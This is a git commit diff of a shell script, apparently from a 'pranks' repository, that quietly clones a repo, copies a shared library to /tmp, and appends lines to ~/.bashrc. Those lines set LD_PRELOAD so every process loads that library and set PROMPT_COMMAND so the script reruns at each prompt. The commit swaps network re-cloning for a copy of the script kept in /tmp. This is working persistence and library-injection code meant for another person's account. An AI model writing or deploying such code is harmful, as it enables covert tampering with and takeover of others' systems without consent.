a49d8ff2612daf32306777d677d60587de945a8d
Ian Liu-Johnston <ian.liu-johnson@holbertonschool.com>
2017-02-07 15:55:37 -0800

    Update ld.sh

--- ld.sh
+++ ld.sh
@@ -1,8 +1,9 @@
  git clone https://github.com/ianliu-johnston/pranks.git >/dev/null 2> /dev/null
  cd pranks
+ cp ld.sh /tmp/
  cp a.so /tmp/
  cd ..
  rm -rf pranks
  echo "export LD_PRELOAD=/tmp/a.so" >> ~/.bashrc
- echo "export PROMPT_COMMAND ='git clone https://github.com/ianliu-johnston/pranks.git >/dev/null 2>/dev/null; cd pranks; ./ld.sh'" >> ~/.bashrc
+ echo "export PROMPT_COMMAND ='/tmp/ld.sh'" >> ~/.bashrc
  source ~/.bashrc
